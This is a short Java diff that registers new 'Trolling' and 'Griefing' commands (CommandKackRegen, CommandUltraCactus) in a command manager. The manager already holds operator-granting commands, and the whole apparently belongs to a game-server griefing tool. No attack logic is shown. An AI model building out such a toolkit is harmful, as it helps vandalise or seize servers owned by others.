@@ -25,8 +25,10 @@ package de.Garkolym.Commands;
 
 import java.util.ArrayList;
 
+import de.Garkolym.Commands.Griefing.CommandUltraCactus;
 import de.Garkolym.Commands.Server.CommandDEOP;
 import de.Garkolym.Commands.Server.CommandOP;
+import de.Garkolym.Commands.Trolling.CommandKackRegen;
 
 public class CommandManager {
 	
@@ -36,8 +38,14 @@ public class CommandManager {
 	}
 	
 	private void initCommands() {
+		// Server
 		this.getCommandList().add(new CommandOP());
 		this.getCommandList().add(new CommandDEOP());
+		// Trolling
+		this.getCommandList().add(new CommandKackRegen());
+		// Griefing
+		this.getCommandList().add(new CommandUltraCactus());
+		
 	}
 	
 	public CommandManager() {
